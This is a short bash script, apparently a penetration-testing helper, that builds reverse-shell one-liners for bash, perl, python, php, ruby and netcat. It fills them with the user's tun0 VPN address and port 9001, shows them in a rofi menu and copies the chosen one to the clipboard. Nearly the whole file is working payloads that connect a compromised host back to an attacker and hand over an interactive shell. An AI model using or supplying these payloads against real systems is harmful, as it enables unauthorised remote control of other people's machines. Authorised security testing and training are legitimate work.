#!/bin/bash

IP=$(ip -o -4 a s dev tun0 |sed 's/.*inet \(.*\)\/.*/\1/')
PORT=9001
declare -A shells
options=( bash perl python php ruby nc nc-advanced )
shells['bash']="bash -i >& /dev/tcp/$IP/$PORT 0>&1"
shells['perl']="perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
shells['python']="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
shells['php']="php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
shells['ruby']="ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
shells['nc']="nc -e /bin/sh $IP $PORT"
shells['nc-advanced']="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

o=$(echo ${options[*]} | tr ' ' '\n'| rofi -dmenu -i -markup-rows \
    -p "Select your option : ")

out=${shells[$o]}
echo $out|xclip -i -selection clipbaord
echo $out
